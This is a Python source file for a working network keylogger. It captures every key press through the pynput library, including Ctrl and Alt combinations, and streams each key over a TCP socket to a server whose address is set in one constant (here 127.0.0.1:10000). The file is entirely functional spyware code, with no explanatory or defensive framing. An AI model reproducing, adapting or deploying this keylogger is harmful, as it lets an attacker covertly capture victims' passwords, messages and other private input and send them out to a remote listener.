import socket
import sys

from pynput import keyboard

SERVER_ADDRESS = "127.0.0.1"
SERVER_PORT = 10000

ctrl_state, alt_state = False, False

KEY_MAP = {"enter": "\n", "space": " ", "tab": "\t"}


def on_key_press(key) -> None:
    global ctrl_state, alt_state
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        ctrl_state = True
        return
    elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
        alt_state = True
    if hasattr(key, "char"):
        if not hasattr(key, "vk"):
            return
        elif ctrl_state or alt_state:
            pressed = f"[{'CTRL+' if ctrl_state else ''}{'ALT+' if alt_state else ''}{chr(key.vk)}]"
        else:
            pressed = key.char
    else:
        pressed = KEY_MAP.get(
            key.name.split("_")[0], "[{0}]".format(key.name.split("_")[0])
        ).upper()
    connection.send(pressed)


def on_key_release(key) -> None:
    global ctrl_state, alt_state
    if key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        ctrl_state = False
    elif key in (keyboard.Key.alt_l, keyboard.Key.alt_r):
        alt_state = False


class Connection:
    def __init__(self, host: str, port: int) -> None:
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))

    def send(self, data: str) -> None:
        self.sock.send(data.encode())

    def close(self) -> None:
        self.sock.close()


if __name__ == "__main__":
    connection = Connection(SERVER_ADDRESS, SERVER_PORT)
    with keyboard.Listener(
        on_press=on_key_press, on_release=on_key_release
    ) as listener:
        listener.join()
